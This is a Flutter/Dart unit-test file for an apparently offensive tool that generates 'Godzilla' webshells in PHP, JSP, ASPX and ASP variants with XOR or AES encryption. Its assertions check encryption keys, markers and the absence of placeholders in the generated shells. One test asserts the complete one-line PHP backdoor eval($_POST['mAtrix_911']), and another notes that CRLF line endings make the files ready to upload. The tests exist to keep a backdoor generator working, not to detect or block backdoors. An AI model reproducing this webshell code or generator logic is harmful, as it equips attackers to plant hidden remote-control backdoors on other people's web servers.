import 'package:flutter_test/flutter_test.dart';
import 'package:matrix/connectors/godzilla/godzilla_shell_generator.dart';

void main() {
  // rootBundle 需要 Flutter binding。
  TestWidgetsFlutterBinding.ensureInitialized();

  group('Godzilla 马生成器', () {
    test('加密器可按 ID 反查，并归属到 4 个架构连接器', () {
      expect(GodzillaCryption.values, hasLength(11));
      for (final cryption in GodzillaCryption.values) {
        expect(GodzillaCryption.fromCryptionId(cryption.id), cryption);
        expect(
          ['php_godzilla', 'jsp_godzilla', 'aspx_godzilla', 'asp_godzilla'],
          contains(cryption.connectorType),
        );
      }
    });

    test('PHP 模板替换密码与 key16，无残留占位符', () async {
      final shell = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.phpXorBase64,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(shell.key16, '3c6e0b8a9c15224a');
      expect(shell.fileName, 'shell.php');
      expect(shell.content, contains(r"$pass = 'mAtrix_911';"));
      expect(shell.content, contains(r"$key = '3c6e0b8a9c15224a';"));
      expect(shell.content, contains('getBasicsInfo'));
      expect(_placeholderCount(shell.content), 0);
    });

    test('RAW 变体：无标记、无 base64 外壳', () async {
      final phpRaw = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.phpXorRaw,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(phpRaw.content, contains(r"php://input"));
      expect(phpRaw.content, isNot(contains('md5(')));

      final jspRaw = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.javaAesRaw,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(jspRaw.content, contains('getOutputStream().write'));
      expect(jspRaw.content, contains('pageContext.pushBody()'));
      expect(jspRaw.content, isNot(contains('base64')));
    });

    test('PHP_EVAL 产物是一句话 eval 壳', () async {
      final shell = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.phpEvalXorBase64,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(shell.content, contains(r"eval($_POST['mAtrix_911']);"));
      expect(shell.byteLength, lessThan(800));
      expect(_placeholderCount(shell.content), 0);
    });

    test('ASP_BASE64 / ASP_RAW 产物不含 XOR', () async {
      final b64 = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.aspBase64,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(b64.content, isNot(contains('MxXor')));
      expect(b64.content, contains('"371be1"'));

      final raw = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.aspRaw,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(raw.content, contains('Request.BinaryRead'));
      expect(raw.content, isNot(contains('Base64')));
    });

    test('JSP 产物：大写标记、无 JSP 隐式 out 冲突', () async {
      final shell = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.javaAesBase64,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(shell.content, contains('.toUpperCase()'));
      // JSP 隐式对象 out 不能被局部变量覆盖，否则 Jasper 报 Duplicate local variable。
      expect(shell.content, contains('ByteArrayOutputStream mxOut'));
      expect(shell.content, contains('f.equals(mxOut);'));
      expect(shell.content, isNot(contains('ByteArrayOutputStream out =')));
      expect(_placeholderCount(shell.content), 0);
    });

    test('ASPX 产物：key 同时作为 IV，引擎类名为 LY', () async {
      final shell = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.csharpAesBase64,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(shell.content, contains('CreateInstance("LY")'));
      expect(shell.content, contains('mxAlg.IV = mxKey;'));
      expect(shell.content, contains('"3c6e0b8a9c15224a"'));
      expect(_placeholderCount(shell.content), 0);
    });

    test('ASP 产物：6 字符标记在生成时固化', () async {
      final shell = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.aspXorBase64,
        password: 'mAtrix_911',
        secretKey: 'key',
      );
      expect(shell.content, contains('"371be1"'));
      expect(shell.content, contains('"279ab2"'));
      expect(shell.content, contains('(i Mod keySize) + 1'));
      expect(_placeholderCount(shell.content), 0);
    });

    test('不同密钥/密码生成不同产物', () async {
      final a = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.phpXorBase64,
        password: 'pass_a',
        secretKey: 'key_a',
      );
      final b = await GodzillaShellGenerator.generate(
        cryption: GodzillaCryption.phpXorBase64,
        password: 'pass_b',
        secretKey: 'key_b',
      );
      expect(a.content, isNot(equals(b.content)));
      expect(a.key16, isNot(equals(b.key16)));
    });

    test('密码非法时给出可读错误', () {
      expect(
        () => GodzillaShellGenerator.validatePassword(''),
        throwsA(isA<GodzillaShellGeneratorException>()),
      );
      expect(
        () => GodzillaShellGenerator.validatePassword("bad'pass"),
        throwsA(isA<GodzillaShellGeneratorException>()),
      );
      expect(
        () => GodzillaShellGenerator.validatePassword('a' * 65),
        throwsA(isA<GodzillaShellGeneratorException>()),
      );
    });

    test('Windows 换行，便于直接保存上传', () async {
      for (final cryption in GodzillaCryption.values) {
        final shell = await GodzillaShellGenerator.generate(
          cryption: cryption,
          password: 'mAtrix_911',
          secretKey: 'key',
        );
        expect(shell.content, contains('\r\n'), reason: cryption.id);
        expect(
          shell.content.replaceAll('\r\n', '').contains('\n'),
          isFalse,
          reason: '${cryption.id} 混用了 LF 与 CRLF',
        );
      }
    });
  });
}

int _placeholderCount(String content) =>
    RegExp(r'\{\{[A-Z_]+\}\}').allMatches(content).length;
